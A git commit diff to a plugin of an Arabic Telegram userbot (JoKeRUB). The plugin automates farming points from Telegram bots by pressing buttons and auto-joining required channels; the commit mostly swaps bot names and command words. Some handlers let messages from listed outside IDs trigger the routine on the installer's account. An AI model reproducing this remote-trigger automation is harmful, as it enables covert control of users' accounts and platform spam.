1610000741440dc5610925bec2e29dfa3c312ba2
aesareetcuu6jllk <amalgurnet19@gmail.com>
2025-03-07 21:07:37 +0300

    Update التجميع.py

--- JoKeRUB/plugins/التجميع.py
+++ JoKeRUB/plugins/التجميع.py
@@ -17,10 +17,10 @@ from ..Config import Config
 import re
 from telethon import events
 c = requests.session()
-bot_username = '@EEObot'
-bot_username2 = '@A_MAN9300BOT'
-bot_username3 = '@MARKTEBOT'
-bot_username4 = '@qweqwe1919bot'
+bot_username = '@Ershkalibot'
+bot_username2 = '@Ershkalibot'
+bot_username3 = '@Ershkalibot'
+bot_username4 = '@EEObot'
 bot_username5 = '@xnsex21bot'
 bot_username6 = '@DamKombot'
 bot_username8 = '@Bellllen192BOT'
@@ -82,15 +82,15 @@ async def Hussein(event):
     
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.message.message.startswith("تجميع الجوكر") and str(event.sender_id) in ConsoleJoker:
-        await event.reply("**᯽︙سيتم تجميع النقاط من بوت الجوكر , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
+    if event.message.message.startswith("تجميع ارشقلي") and str(event.sender_id) in ConsoleJoker:
+        await event.reply("**᯽︙سيتم تجميع النقاط من بوت هيلاس , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
         channel_entity = await l313l.get_entity(bot_username2)
-        await l313l.send_message('@A_MAN9300BOT', '/start')
+        await l313l.send_message('@Ershkalibot', '/start')
         await asyncio.sleep(2)
-        msg0 = await l313l.get_messages('@A_MAN9300BOT', limit=1)
+        msg0 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg0[0].click(2)
         await asyncio.sleep(2)
-        msg1 = await l313l.get_messages('@A_MAN9300BOT', limit=1)
+        msg1 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg1[0].click(0)
 
         chs = 1
@@ -110,7 +110,7 @@ async def Hussein(event):
                 except:
                     bott = url.split('/')[-1]
                     await l313l(ImportChatInviteRequest(bott))
-                msg2 = await l313l.get_messages('@A_MAN9300BOT', limit=1)
+                msg2 = await l313l.get_messages('@Ershkalibot', limit=1)
                 await msg2[0].click(text='تحقق')
                 chs += 1
                 await l313l.send_message("me", f"تم الاشتراك في {chs} قناة")
@@ -122,15 +122,15 @@ async def Hussein(event):
         #await event.edit("يجب الدفع لاستعمال هذا الامر !")
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.message.message.startswith("تجميع العقاب") and str(event.sender_id) in ConsoleJoker:
+    if event.message.message.startswith("تجميع ارشقلي") and str(event.sender_id) in ConsoleJoker:
         await event.reply("**᯽︙سيتم تجميع النقاط من بوت العقاب , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
         channel_entity = await l313l.get_entity(bot_username3)
-        await l313l.send_message('@MARKTEBOT', '/start')
+        await l313l.send_message('@Ershkalibot', '/start')
         await asyncio.sleep(3)
-        msg0 = await l313l.get_messages('@MARKTEBOT', limit=1)
+        msg0 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg0[0].click(2)
         await asyncio.sleep(3)
-        msg1 = await l313l.get_messages('@MARKTEBOT', limit=1)
+        msg1 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg1[0].click(0)
 
         chs = 1
@@ -149,7 +149,7 @@ async def Hussein(event):
                 except:
                     bott = url.split('/')[-1]
                     await l313l(ImportChatInviteRequest(bott))
-                msg2 = await l313l.get_messages('@MARKTEBOT', limit=1)
+                msg2 = await l313l.get_messages('@Ershkalibot', limit=1)
                 await msg2[0].click(text='تحقق')
                 chs += 1
                 await l313l.send_message("me", f"تم الاشتراك في {chs} قناة")
@@ -161,15 +161,15 @@ async def Hussein(event):
         #await event.edit("يجب الدفع لاستعمال هذا الامر !")
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.message.message.startswith("تجميع المليون") and str(event.sender_id) in ConsoleJoker:
-        await event.reply("**᯽︙سيتم تجميع النقاط من بوت المليون , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
+    if event.message.message.startswith("تجميع المليار") and str(event.sender_id) in ConsoleJoker:
+        await event.reply("**᯽︙سيتم تجميع النقاط من بوت المليار , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
         channel_entity = await l313l.get_entity(bot_username4)
-        await l313l.send_message('@qweqwe1919bot', '/start')
+        await l313l.send_message('@EEObot', '/start')
         await asyncio.sleep(2)
-        msg0 = await l313l.get_messages('@qweqwe1919bot', limit=1)
+        msg0 = await l313l.get_messages('@EEObot', limit=1)
         await msg0[0].click(2)
         await asyncio.sleep(2)
-        msg1 = await l313l.get_messages('@qweqwe1919bot', limit=1)
+        msg1 = await l313l.get_messages('@EEObot', limit=1)
         await msg1[0].click(0)
 
         chs = 1
@@ -189,7 +189,7 @@ async def Hussein(event):
                 except:
                     bott = url.split('/')[-1]
                     await l313l(ImportChatInviteRequest(bott))
-                msg2 = await l313l.get_messages('@qweqwe1919bot', limit=1)
+                msg2 = await l313l.get_messages('@EEObot', limit=1)
                 await msg2[0].click(text='تحقق')
                 chs += 1
                 await l313l.send_message("me", f"تم الاشتراك في {chs} قناة")
@@ -244,7 +244,7 @@ async def _(event):
         
 @l313l.on(admin_cmd(pattern="(ايقاف التجميع|ايقاف تجميع)"))
 async def cancel_collection(event):
-    await l313l.send_message('@EEObot', '/start')
+    await l313l.send_message('@Ershkalibot', '/start')
     await event.edit("** ᯽︙ تم الغاء التجميع من بوت المليار **")
     
 @l313l.on(admin_cmd(pattern="(تجميع الجوكر|تجميع جوكر)"))
@@ -252,12 +252,12 @@ async def _(event):
     if JoKeRUB[0] == "yes":
         await event.edit("**᯽︙سيتم تجميع النقاط من بوت الجوكر , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
         channel_entity = await l313l.get_entity(bot_username2)
-        await l313l.send_message('@A_MAN9300BOT', '/start')
+        await l313l.send_message('@Ershkalibot', '/start')
         await asyncio.sleep(2)
-        msg0 = await l313l.get_messages('@A_MAN9300BOT', limit=1)
+        msg0 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg0[0].click(2)
         await asyncio.sleep(2)
-        msg1 = await l313l.get_messages('@A_MAN9300BOT', limit=1)
+        msg1 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg1[0].click(0)
 
         chs = 1
@@ -279,7 +279,7 @@ async def _(event):
                 except:
                     bott = url.split('/')[-1]
                     await l313l(ImportChatInviteRequest(bott))
-                msg2 = await l313l.get_messages('@A_MAN9300BOT', limit=1)
+                msg2 = await l313l.get_messages('@Ershkalibot', limit=1)
                 await msg2[0].click(text='تحقق')
                 chs += 1
                 await l313l.send_message("me", f"تم الاشتراك في {chs} قناة")
@@ -289,17 +289,17 @@ async def _(event):
 
   #  else:
     #    await event.edit("يجب الدفع لاستعمال هذا الامر !")
-@l313l.on(admin_cmd(pattern="(تجميع العقاب|تجميع عقاب)"))
+@l313l.on(admin_cmd(pattern="(تجميع ارشقلي|تجميع ارشقلي)"))
 async def _(event):
     if JoKeRUB[0] == "yes":
         await event.edit("**᯽︙سيتم تجميع النقاط من بوت العقاب , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
         channel_entity = await l313l.get_entity(bot_username3)
-        await l313l.send_message('@MARKTEBOT', '/start')
+        await l313l.send_message('@Ershkalibot', '/start')
         await asyncio.sleep(3)
-        msg0 = await l313l.get_messages('@MARKTEBOT', limit=1)
+        msg0 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg0[0].click(2)
         await asyncio.sleep(3)
-        msg1 = await l313l.get_messages('@MARKTEBOT', limit=1)
+        msg1 = await l313l.get_messages('@Ershkalibot', limit=1)
         await msg1[0].click(0)
 
         chs = 1
@@ -321,7 +321,7 @@ async def _(event):
                 except:
                     bott = url.split('/')[-1]
                     await l313l(ImportChatInviteRequest(bott))
-                msg2 = await l313l.get_messages('@MARKTEBOT', limit=1)
+                msg2 = await l313l.get_messages('@Ershkalibot', limit=1)
                 await msg2[0].click(text='تحقق')
                 chs += 1
                 await l313l.send_message("me", f"تم الاشتراك في {chs} قناة")
@@ -331,17 +331,17 @@ async def _(event):
 
  #   else:
    #     await event.edit("يجب الدفع لاستعمال هذا الامر !")
-@l313l.on(admin_cmd(pattern="(تجميع المليون|تجميع مليون)"))
+@l313l.on(admin_cmd(pattern="(تجميع المليار|تجميع المليار)"))
 async def _(event):
     if JoKeRUB[0] == "yes":
-        await event.edit("**᯽︙سيتم تجميع النقاط من بوت المليون , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
+        await event.edit("**᯽︙سيتم تجميع النقاط من بوت المليار , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
         channel_entity = await l313l.get_entity(bot_username4)
-        await l313l.send_message('@qweqwe1919bot', '/start')
+        await l313l.send_message('@EEObot', '/start')
         await asyncio.sleep(2)
-        msg0 = await l313l.get_messages('@qweqwe1919bot', limit=1)
+        msg0 = await l313l.get_messages('@EEObot', limit=1)
         await msg0[0].click(2)
         await asyncio.sleep(2)
-        msg1 = await l313l.get_messages('@qweqwe1919bot', limit=1)
+        msg1 = await l313l.get_messages('@EEObot', limit=1)
         await msg1[0].click(0)
 
         chs = 1
@@ -363,7 +363,7 @@ async def _(event):
                 except:
                     bott = url.split('/')[-1]
                     await l313l(ImportChatInviteRequest(bott))
-                msg2 = await l313l.get_messages('@qweqwe1919bot', limit=1)
+                msg2 = await l313l.get_messages('@EEObot', limit=1)
                 await msg2[0].click(text='تحقق')
                 chs += 1
                 await l313l.send_message("me", f"تم الاشتراك في {chs} قناة")
